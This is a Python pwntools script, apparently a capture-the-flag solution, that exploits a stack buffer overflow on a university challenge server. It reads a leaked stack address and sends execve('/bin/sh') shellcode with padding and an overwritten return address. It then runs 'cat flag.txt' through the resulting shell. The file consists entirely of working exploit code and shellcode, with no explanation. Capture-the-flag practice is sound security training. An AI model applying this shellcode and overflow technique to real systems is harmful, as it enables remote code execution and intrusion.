from pwn import *
from Crypto.Util.number import long_to_bytes, bytes_to_long

REMOTE = True

IP_ADDRESS = "cyberchallenge.disi.unitn.it"
PORT = 9003

if(REMOTE):
    conn = remote(IP_ADDRESS, PORT)
else:
    conn = process('./bin')

offset = 72
shell_code = b"\x48\x31\xd2"                                  # xor    %rdx, %rdx
shell_code += b"\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68"      # mov	$0x68732f6e69622f2f, %rbx
shell_code += b"\x48\xc1\xeb\x08"                              # shr    $0x8, %rbx
shell_code += b"\x53"                                          # push   %rbx
shell_code += b"\x48\x89\xe7"                                  # mov    %rsp, %rdi
shell_code += b"\x50"                                          # push   %rax
shell_code += b"\x57"                                          # push   %rdi
shell_code += b"\x48\x89\xe6"                                  # mov    %rsp, %rsi
shell_code += b"\xb0\x3b"                                      # mov    $0x3b, %al
shell_code += b"\x0f\x05";                                     # syscall

conn.recvuntil(b"stored at ")
address = int(conn.recvline().strip(), 16)

payload = shell_code + b"A" * (offset - len(shell_code)) + p64(address)
conn.sendline(payload)

conn.sendline(b"cat flag.txt")
conn.recvuntil(b"UniTN")

flag = "UniTN" + conn.recvline().decode()

conn.close()
print(flag)